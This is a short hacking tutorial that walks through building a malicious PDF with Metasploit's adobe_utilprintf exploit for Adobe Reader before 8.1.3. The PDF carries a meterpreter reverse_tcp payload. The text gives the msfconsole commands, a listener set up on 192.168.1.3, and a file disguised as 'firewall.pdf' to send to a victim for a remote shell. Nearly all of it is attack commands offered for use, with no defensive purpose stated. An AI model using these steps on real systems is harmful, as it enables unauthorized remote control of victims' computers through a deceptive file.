Hack Remote XP PC using Adobe util.printf() Buffer Overflow

This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional < 8.1.3. By creating a specially crafted pdf that a contains malformed util.printf() entry, an attacker may be able to execute arbitrary code.
Adobe PDF 8.1.2
Windows XP SP 2
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/adobe_utilprintf
Msf exploit (adobe_utilprintf)>set payload windows/meterpreter/reverse_tcp
Msf exploit (adobe_utilprintf)>set lhost 192.168.1.3 (IP of Local Host)
Msf exploit (adobe_utilprintf)>set filename firewall.pdf
Msf exploit (adobe_utilprintf)>exploit

After we successfully generate the malicious PDF File, it will stored on your local computer
/root/.msf4/local/firewall.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.3
exploit 
Now send your firewall.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
